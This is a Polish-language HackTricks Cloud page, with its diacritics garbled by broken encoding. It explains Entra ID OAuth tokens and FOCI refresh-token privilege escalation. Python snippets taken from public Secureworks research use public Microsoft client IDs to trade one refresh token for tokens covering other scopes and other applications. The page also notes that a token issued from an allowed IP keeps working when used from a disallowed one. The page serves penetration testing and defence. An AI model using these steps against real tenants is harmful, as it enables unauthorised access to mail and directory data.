# Az - Tokeny i Aplikacje Publiczne

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Podstawowe Informacje

Entra ID to platforma zarzdzania to偶samoci i dostpem (IAM) w chmurze firmy Microsoft, stanowica podstawowy system uwierzytelniania i autoryzacji dla usug takich jak Microsoft 365 i Azure Resource Manager. Azure AD wdra偶a ramy autoryzacji OAuth 2.0 oraz protok贸 uwierzytelniania OpenID Connect (OIDC) do zarzdzania dostpem do zasob贸w.

### OAuth

**Kluczowi Uczestnicy w OAuth 2.0:**

1. **Serwer Zasob贸w (RS):** Chroni zasoby nale偶ce do waciciela zasob贸w.
2. **Waciciel Zasob贸w (RO):** Zazwyczaj u偶ytkownik kocowy, kt贸ry posiada chronione zasoby.
3. **Aplikacja Klienta (CA):** Aplikacja starajca si o dostp do zasob贸w w imieniu waciciela zasob贸w.
4. **Serwer Autoryzacji (AS):** Wydaje tokeny dostpu aplikacjom klienckim po ich uwierzytelnieniu i autoryzacji.

**Zakresy i Zgoda:**

* **Zakresy:** Granularne uprawnienia zdefiniowane na serwerze zasob贸w, kt贸re okrelaj poziomy dostpu.
* **Zgoda:** Proces, w kt贸rym waciciel zasob贸w przyznaje aplikacji klienckiej pozwolenie na dostp do zasob贸w z okrelonymi zakresami.

**Integracja z Microsoft 365:**

* Microsoft 365 wykorzystuje Azure AD do IAM i skada si z wielu aplikacji OAuth "pierwszej strony".
* Aplikacje te s gboko zintegrowane i czsto maj wzajemne relacje serwisowe.
* Aby uproci dowiadczenia u偶ytkownik贸w i utrzyma funkcjonalno, Microsoft przyznaje "domyln zgod" lub "wstpn zgod" tym aplikacjom pierwszej strony.
* **Domylna Zgoda:** Niekt贸re aplikacje s automatycznie **przyznawane dostp do okrelonych zakres贸w bez wyra藕nej zgody u偶ytkownika lub administratora**.
* Te wstpnie wyra偶one zgody s zazwyczaj ukryte zar贸wno przed u偶ytkownikami, jak i administratorami, co sprawia, 偶e s mniej widoczne w standardowych interfejsach zarzdzania.

**Typy Aplikacji Klient贸w:**

1. **Poufne Klienty:**
* Posiadaj wasne powiadczenia (np. hasa lub certyfikaty).
* Mog **bezpiecznie uwierzytelnia si** na serwerze autoryzacji.
2. **Publiczne Klienty:**
* Nie maj unikalnych powiadcze.
* Nie mog bezpiecznie uwierzytelnia si na serwerze autoryzacji.
* **Implikacja Bezpieczestwa:** Atakujcy mo偶e podszy si pod publiczn aplikacj klienck podczas 偶dania token贸w, poniewa偶 nie ma mechanizmu, kt贸ry pozwalaby serwerowi autoryzacji zweryfikowa legalno aplikacji.

## Tokeny Uwierzytelniajce

Istniej **trzy typy token贸w** u偶ywanych w OIDC:

* [**Tokeny Dostpu**](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)**:** Klient przedstawia ten token serwerowi zasob贸w, aby **uzyska dostp do zasob贸w**. Mo偶e by u偶ywany tylko dla okrelonej kombinacji u偶ytkownika, klienta i zasobu i **nie mo偶e by uniewa偶niony** do momentu wyganicia - co wynosi domylnie 1 godzin.
* **Tokeny ID**: Klient otrzymuje ten **token od serwera autoryzacji**. Zawiera podstawowe informacje o u偶ytkowniku. Jest **powizany z okrelon kombinacj u偶ytkownika i klienta**.
* **Tokeny Odwie偶ajce**: Przyznawane klientowi wraz z tokenem dostpu. U偶ywane do **uzyskiwania nowych token贸w dostpu i ID**. Jest powizany z okrelon kombinacj u偶ytkownika i klienta i mo偶e by uniewa偶niony. Domylne wyganicie wynosi **90 dni** dla nieaktywnych token贸w odwie偶ajcych i **brak wyganicia dla aktywnych token贸w** (z tokena odwie偶ajcego mo偶na uzyska nowe tokeny odwie偶ajce).
* Token odwie偶ajcy powinien by powizany z **`aud`**, z pewnymi **zakresami** i z **dzier偶awc** i powinien by w stanie generowa tokeny dostpu tylko dla tego aud, zakres贸w (i nic wicej) oraz dzier偶awcy. Jednak nie jest to prawd w przypadku **token贸w aplikacji FOCI**.
* Token odwie偶ajcy jest szyfrowany i tylko Microsoft mo偶e go odszyfrowa.
* Uzyskanie nowego tokena odwie偶ajcego nie uniewa偶nia poprzedniego tokena odwie偶ajcego.

{% hint style="warning" %}
Informacje o **dostpie warunkowym** s **przechowywane** wewntrz **JWT**. Jeli wic za偶dacie **tokena z dozwolonego adresu IP**, ten **IP** zostanie **przechowany** w tokenie, a nastpnie mo偶ecie u偶y tego tokena z **niedozwolonego IP, aby uzyska dostp do zasob贸w**.
{% endhint %}

### Tokeny Dostpu "aud"

Pole wskazane w polu "aud" to **serwer zasob贸w** (aplikacja) u偶ywany do przeprowadzenia logowania.

Polecenie `az account get-access-token --resource-type [...]` obsuguje nastpujce typy, a ka偶dy z nich doda okrelone "aud" w wynikowym tokenie dostpu:

{% hint style="danger" %}
Zauwa偶, 偶e poni偶sze to tylko API obsugiwane przez `az account get-access-token`, ale jest ich wicej.
{% endhint %}

<details>

<summary>Przykady aud</summary>

* **aad-graph (Azure Active Directory Graph API)**: U偶ywane do uzyskiwania dostpu do przestarzaego Azure AD Graph API (dezaktywowane), kt贸re pozwala aplikacjom na odczyt i zapis danych katalogowych w Azure Active Directory (Azure AD).
* `https://graph.windows.net/`

- **arm (Azure Resource Manager)**: U偶ywane do zarzdzania zasobami Azure za porednictwem API Azure Resource Manager. Obejmuje operacje takie jak tworzenie, aktualizowanie i usuwanie zasob贸w, takich jak maszyny wirtualne, konta magazynowe i inne.
* `https://management.core.windows.net/ lub https://management.azure.com/`

* **batch (Azure Batch Services)**: U偶ywane do uzyskiwania dostpu do Azure Batch, usugi, kt贸ra umo偶liwia efektywne uruchamianie aplikacji obliczeniowych w du偶ej skali i wysokiej wydajnoci w chmurze.
* `https://batch.core.windows.net/`

- **data-lake (Azure Data Lake Storage)**: U偶ywane do interakcji z Azure Data Lake Storage Gen1, kt贸re jest skalowaln usug przechowywania danych i analityki.
* `https://datalake.azure.net/`

* **media (Azure Media Services)**: U偶ywane do uzyskiwania dostpu do Azure Media Services, kt贸re oferuj usugi przetwarzania i dostarczania medi贸w w chmurze dla treci wideo i audio.
* `https://rest.media.azure.net`

- **ms-graph (Microsoft Graph API)**: U偶ywane do uzyskiwania dostpu do Microsoft Graph API, zjednoczonego punktu kocowego dla danych usug Microsoft 365. Umo偶liwia dostp do danych i informacji z usug takich jak Azure AD, Office 365, Enterprise Mobility i usugi bezpieczestwa.
* `https://graph.microsoft.com`

* **oss-rdbms (Azure Open Source Relational Databases)**: U偶ywane do uzyskiwania dostpu do usug baz danych Azure dla otwartych silnik贸w baz danych relacyjnych, takich jak MySQL, PostgreSQL i MariaDB.
* `https://ossrdbms-aad.database.windows.net`

</details>

### Zakresy Token贸w Dostpu "scp"

Zakres tokena dostpu jest przechowywany wewntrz klucza scp w tokenie dostpu JWT. Te zakresy definiuj, do czego token dostpu ma dostp.

Jeli JWT ma prawo kontaktowa si z okrelonym API, ale **nie ma zakresu** do wykonania 偶danej akcji, **nie bdzie w stanie wykona tej akcji** z tym JWT.

### Przykad uzyskania tokena odwie偶ajcego i dostpu
```python
# Code example from https://github.com/secureworks/family-of-client-ids-research
import msal
import requests
import jwt
from pprint import pprint
from typing import Any, Dict, List


# LOGIN VIA CODE FLOW AUTHENTICATION
azure_cli_client = msal.PublicClientApplication(
"04b07795-8ddb-461a-bbee-02f9e1bf7b46" # ID for Azure CLI client
)
device_flow = azure_cli_client.initiate_device_flow(
scopes=["https://graph.microsoft.com/.default"]
)
print(device_flow["message"])

# Perform device code flow authentication

azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
device_flow
)
pprint(azure_cli_bearer_tokens_for_graph_api)



# DECODE JWT
def decode_jwt(base64_blob: str) -> Dict[str, Any]:
"""Decodes base64 encoded JWT blob"""
return jwt.decode(
base64_blob, options={"verify_signature": False, "verify_aud": False}
)
decoded_access_token = decode_jwt(
azure_cli_bearer_tokens_for_graph_api.get("access_token")
)
pprint(decoded_access_token)


# GET NEW ACCESS TOKEN AND REFRESH TOKEN
new_azure_cli_bearer_tokens_for_graph_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
# Same scopes as original authorization
scopes=["https://graph.microsoft.com/.default"],
)
)
pprint(new_azure_cli_bearer_tokens_for_graph_api)
```
## FOCI Tokens Privilege Escalation

Wczeniej wspomniano, 偶e tokeny odwie偶ajce powinny by powizane z **zakresami**, z kt贸rymi zostay wygenerowane, z **aplikacj** i **dzier偶aw**, do kt贸rej zostay wygenerowane. Jeli jakakolwiek z tych granic zostanie naruszona, mo偶liwe jest eskalowanie uprawnie, poniewa偶 bdzie mo偶na generowa tokeny dostpu do innych zasob贸w i dzier偶aw, do kt贸rych u偶ytkownik ma dostp, oraz z wikszymi zakresami, ni偶 pierwotnie zamierzano.

Co wicej, **jest to mo偶liwe z wszystkimi tokenami odwie偶ajcymi** w [Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/) (konta Microsoft Entra, konta osobiste Microsoft oraz konta spoecznociowe, takie jak Facebook i Google), poniewa偶 jak wspominaj [**dokumenty**](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens): "Tokeny odwie偶ajce s powizane z kombinacj u偶ytkownika i klienta, ale **nie s powizane z zasobem ani dzier偶aw**. Klient mo偶e u偶y tokena odwie偶ajcego do uzyskania token贸w dostpu **w dowolnej kombinacji zasob贸w i dzier偶aw**, do kt贸rych ma pozwolenie. Tokeny odwie偶ajce s szyfrowane i tylko platforma to偶samoci Microsoft mo偶e je odczyta."

Ponadto, nale偶y zauwa偶y, 偶e aplikacje FOCI s aplikacjami publicznymi, wic **nie jest wymagany 偶aden sekret** do uwierzytelnienia na serwerze.

Znane klient贸w FOCI zgoszone w [**oryginalnych badaniach**](https://github.com/secureworks/family-of-client-ids-research/tree/main) mo偶na [**znale藕 tutaj**](https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv).

### Get different scope

Kontynuujc poprzedni przykad kodu, w tym kodzie 偶dany jest nowy token dla innego zakresu:
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
azure_cli_bearer_tokens_for_outlook_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
new_azure_cli_bearer_tokens_for_graph_api.get(
"refresh_token"
),
# But different scopes than original authorization
scopes=[
"https://outlook.office.com/.default"
],
)
)
pprint(azure_cli_bearer_tokens_for_outlook_api)
```
### Uzyskaj r贸偶ne klienty i zakresy
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")
microsoft_office_bearer_tokens_for_graph_api = (
# This is a different client application than we used in the previous examples
microsoft_office_client.acquire_token_by_refresh_token(
# But we can use the refresh token issued to our original client application
azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
# And request different scopes too
scopes=["https://graph.microsoft.com/.default"],
)
)
# How is this possible?
pprint(microsoft_office_bearer_tokens_for_graph_api)
```
## Odniesienia

* [https://github.com/secureworks/family-of-client-ids-research](https://github.com/secureworks/family-of-client-ids-research)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
